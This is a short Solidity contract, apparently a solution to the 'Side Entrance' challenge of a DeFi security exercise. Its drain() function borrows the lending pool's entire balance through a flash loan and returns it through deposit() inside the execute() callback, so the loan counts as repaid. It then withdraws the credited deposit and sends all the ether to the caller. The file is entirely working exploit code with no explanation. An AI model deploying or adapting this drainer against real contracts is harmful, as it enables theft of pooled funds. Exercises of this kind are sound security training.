// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";


contract SideEntranceDrainer {
	using Address for address payable;

	address poolAddress;

	constructor (address _poolAddress) {
        poolAddress = _poolAddress;
    }

    function drain() external  {
    	uint balance = poolAddress.balance;
    	SideEntranceLenderPool(poolAddress).flashLoan(balance);
    	SideEntranceLenderPool(poolAddress).withdraw();
    	payable(msg.sender).sendValue(balance);
    }

    function execute() external payable {
    	SideEntranceLenderPool(poolAddress).deposit{value: msg.value}();
    }

    fallback() external payable {}
}